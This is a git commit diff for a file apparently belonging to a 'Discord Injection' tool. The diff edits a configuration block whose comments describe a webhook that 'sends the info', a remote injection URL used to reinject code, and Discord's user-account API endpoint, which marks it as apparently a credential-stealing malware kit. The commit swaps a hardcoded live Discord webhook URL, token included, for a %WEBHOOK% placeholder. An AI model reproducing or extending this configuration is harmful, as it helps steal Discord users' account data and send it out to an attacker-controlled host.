62afc6057898fd3bf5eb6cba75dc71bb3b21b07a
aaditya888 <77214595+aaditya888@users.noreply.github.com>
2022-04-01 23:49:49 +0300

    Update Injection-clean.js

--- Injection-clean.js
+++ Injection-clean.js
@@ -11,7 +11,7 @@ const config = {
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-    webhook: 'https://discord.com/api/webhooks/959550839196876822/CXl2KgiIP47KllXZP6MH2k1lHOHYt5kZO4d_EGlMHQ1icdg1sGIvzXmdv4m6UToVfx-1', //your discord webhook there obviously
+    webhook: '%WEBHOOK%', //your discord webhook there obviously
     injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: 'https://discord.com/api/v9/users/@me',
